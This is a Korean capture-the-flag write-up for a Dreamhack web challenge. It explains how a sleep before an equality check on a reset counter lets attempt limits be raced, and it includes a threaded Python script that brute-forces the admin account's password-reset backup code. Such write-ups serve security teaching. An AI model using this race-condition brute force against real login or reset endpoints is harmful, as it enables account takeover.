## 풀이

동기와 함께 풀었던 문제
정말 pure하게 취약한 포인트를 찾았어서 뿌듯하고 기억에 남는 문제이다.

```python
@app.route('/user/<int:useridx>')
def users(useridx):
    conn = get_db()
    cur = conn.cursor()
    user = cur.execute('SELECT * FROM user WHERE idx = ?;', [str(useridx)]).fetchone()
    
    if user:
        return render_template('user.html', user=user)

    return "<script>alert('User Not Found.');history.back(-1);</script>";
```

우선 코드상에 있는 /user/를 통해 유저 정보를 알아낸다. 우리는 user_level이 1인 admin 계정을 찾아야 한다. 

/user/1 에 들어가면 Apple이라는 계정이 나오고 이는 admin 권한의 계정임을 알 수 있다.

```python
@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'GET':
        return render_template('forgot.html')
    else:
        userid = request.form.get("userid")
        newpassword = request.form.get("newpassword")
        backupCode = request.form.get("backupCode", type=int)

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            # security for brute force Attack.
            time.sleep(1)

            if user['resetCount'] == MAXRESETCOUNT:
                return "<script>alert('reset Count Exceed.');history.back(-1);</script>"
            
            if user['backupCode'] == backupCode:
                newbackupCode = makeBackupcode()
                updateSQL = "UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?"
                cur.execute(updateSQL, (hashlib.sha256(newpassword.encode()).hexdigest(), newbackupCode, str(user['idx'])))
                msg = f"<b>Password Change Success.</b><br/>New BackupCode : {newbackupCode}"

            else:
                updateSQL = "UPDATE user set resetCount = resetCount+1 where idx = ?"
                cur.execute(updateSQL, (str(user['idx'])))
                msg = f"Wrong BackupCode !<br/><b>Left Count : </b> {(MAXRESETCOUNT-1)-user['resetCount']}"
            
            conn.commit()
            return render_template("index.html", msg=msg)

        return "<script>alert('User Not Found.');history.back(-1);</script>";
```

그리고 로그인 쪽에 남아있는 기능인 forgot_password는 최초 가입시 생성된 백업코드를 활용해서 비밀번호를 바꾸게 된다. 이때 backupCode가 맞는지 확인을 하고 틀리면 resetCount를 1 감소 시키는데, 최대 5번까지 틀릴 수 있다. 여기까지 보면 꽤 안전해보이지만, 취약한 포인트는 여기 존재한다.

```python
if user:
    # security for brute force Attack.
    time.sleep(1)

    if user['resetCount'] == MAXRESETCOUNT:
        return "<script>alert('reset Count Exceed.');history.back(-1);</script>"
```

resetCount를 체크하는 과정에서 time.sleep(1)로 1초의 시간이 소요된다는 것과 부등호가 아닌 등호로 resetCount를 체크한다는 것이다. 이때 자동화된 모듈을 활용해서 1초 내에 100개의 요청을 클리어하거나, MAXRESETCOUNT를 넘어서게끔 만들면 될 것이다. 따라서 쓰레드와 같은 도구를 활용해 brute-force를 수행할 수 있다. 

```python
from threading import Thread
import requests

backup_codes = range(100)

def run(code, results):
    url = 'http://host1.dreamhack.games:21893/forgot_password'
    data = {
        'userid': 'Apple',
        'newpassword': 'admin',
        'backupCode': code
    }
    print(code)
    res = requests.post(url, data=data)

    if 'Wrong' in res.text:
        pass
    else:
        print('Success!! Password Changed with Apple/admin')
        return

results = [None] * 100
for i in backup_codes:
    Thread(target=run, args=(i, results)).start()
```

이러면 Apple 계정이 admin으로 비밀번호가 변경된다.